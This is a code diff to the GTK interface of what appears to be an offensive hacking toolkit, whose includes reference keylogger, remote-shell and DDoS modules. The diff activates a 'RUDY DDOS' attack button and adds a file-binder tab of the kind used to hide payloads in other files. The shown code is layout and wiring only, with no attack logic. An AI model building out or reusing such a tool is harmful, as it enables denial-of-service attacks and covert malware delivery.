@@ -18,18 +18,18 @@
 #include "../includes/callbacks_keyloggers.h"
 #include "../includes/callbacks_remote_shell.h"
 #include "../includes/callbacks_ddos.h"
+#include "../includes/callbacks_rudy_ddos.h"
 
 
 
 GtkWidget *main_win = NULL;
 
 GtkWidget *text_view = NULL;
+GtkWidget *rs_text_view = NULL;
+GtkWidget *ddos_text_view = NULL;
 
 GtkWidget *upload_entry = NULL;
-
-GtkWidget *rs_text_view = NULL;
-
-GtkWidget *ddos_text_view = NULL;
+GtkWidget *binder_entry = NULL;
 
 int main(int argc, char *argv[])
 {
@@ -113,6 +113,9 @@ void fill_window(char *argv[])
     GtkWidget *head_send_script = NULL;
     GtkWidget *post_send_script = NULL;
     GtkWidget *slowloris_send_script = NULL;
+
+    /** Binder **/
+    //GtkWidget *binder_entry = NULL;
 
     /** Hosts file **/
     GtkWidget *download_hosts_files = NULL;
@@ -459,7 +462,7 @@ computer across a computer network.\"", -1);
     rudy_send_script = gtk_button_new_with_label("RUDY DDOS");
     gtk_widget_set_size_request(rudy_send_script, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[2]), rudy_send_script, 760, 50);
-    //g_signal_connect(G_OBJECT(rudy_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);
+    g_signal_connect(G_OBJECT(rudy_send_script), "clicked", G_CALLBACK(rudy_ddos), NULL);
 
     arme_send_script = gtk_button_new_with_label("ARME DDOS");
     gtk_widget_set_size_request(arme_send_script, 200, 30);
@@ -484,7 +487,49 @@ computer across a computer network.\"", -1);
     slowloris_send_script = gtk_button_new_with_label("SLOWLORIS DDOS");
     gtk_widget_set_size_request(slowloris_send_script, 200, 30);
     gtk_fixed_put(GTK_FIXED(zone[2]), slowloris_send_script, 980, 150);
-    //g_signal_connect(G_OBJECT(slowloris_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);
+    //g_signal_connect(G_OBJECT(slowloris_send_script), "clicked", G_CALLBACK(cb_exec_DDOS_script), NULL);s
+
+
+    /** TAB : Binder **/
+
+    //GtkWidget *binder_entry = NULL;
+    GtkWidget *binder_browse_button = NULL;
+    GtkWidget *binder_bind_button = NULL;
+
+    binder_entry = gtk_entry_new_with_max_length(40);
+    gtk_entry_set_text(GTK_ENTRY(binder_entry), "Open the file to bind");
+    gtk_widget_set_size_request(binder_entry, 240, 30);
+    gtk_fixed_put(GTK_FIXED(zone[3]), binder_entry, 270, 150);
+
+    binder_browse_button = gtk_button_new_with_label("Browse");
+    gtk_widget_set_size_request(binder_browse_button, 105, 30);
+    gtk_fixed_put(GTK_FIXED(zone[3]), binder_browse_button, 520 , 150);
+    g_signal_connect(G_OBJECT(binder_browse_button), "clicked", G_CALLBACK(cb_binder_open_file), binder_entry);
+
+    binder_bind_button = gtk_button_new_with_label("Bind File");
+    gtk_widget_set_size_request(binder_bind_button, 105, 30);
+    gtk_fixed_put(GTK_FIXED(zone[3]), binder_bind_button, 650 , 150);
+    g_signal_connect(G_OBJECT(binder_bind_button), "clicked", G_CALLBACK(cb_bind_file), NULL);
+
+    frame[7] = gtk_frame_new(NULL);
+    gtk_frame_set_label(GTK_FRAME(frame[7]), "- Logs - ");
+    gtk_frame_set_label_align(GTK_FRAME(frame[7]), (gfloat)0.05, (gfloat)0.5);
+    gtk_frame_set_shadow_type(GTK_FRAME(frame[7]), GTK_SHADOW_OUT);
+
+    gtk_widget_set_usize(frame[7], 540, 190);
+    gtk_fixed_put(GTK_FIXED(zone[3]), frame[7], 370, 400);
+
+    /** scrolled window on the side of the windows **/
+    ddos_scrollbar = gtk_scrolled_window_new(NULL, NULL);
+    gtk_fixed_put(GTK_FIXED(zone[3]), ddos_scrollbar, 380, 420);
+    gtk_widget_set_size_request(ddos_scrollbar, 520, 157);
+
+    /** Side window (log) **/
+    ddos_text_view = gtk_text_view_new();
+    gtk_container_add(GTK_CONTAINER(ddos_scrollbar), ddos_text_view);
+    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(ddos_scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
+    //gtk_widget_set_size_request(ddos_text_view, 320, 400);
+
 
     /** Frame 4 (Logs) **/
     frame[6] = gtk_frame_new(NULL);
